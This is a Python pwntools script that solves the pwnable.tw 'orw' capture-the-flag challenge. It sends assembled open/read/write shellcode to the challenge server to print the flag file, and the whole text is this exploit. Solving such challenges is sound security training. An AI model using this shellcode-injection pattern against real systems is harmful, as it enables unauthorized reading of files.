#! /usr/bin/python
from pwn import *

#r = process('./orw')
r = remote('chall.pwnable.tw',10001)
#gdb.attach(r,'b* 0x804858a')

payload = ''
payload += asm(shellcraft.open("/home/orw/flag"))
payload += asm(shellcraft.read("eax",0x804a450,0x100)) # bss 0x804a450
payload += asm(shellcraft.write(1,0x804a450,0x100))


r.sendlineafter('Give my your shellcode:',payload)

r.interactive()
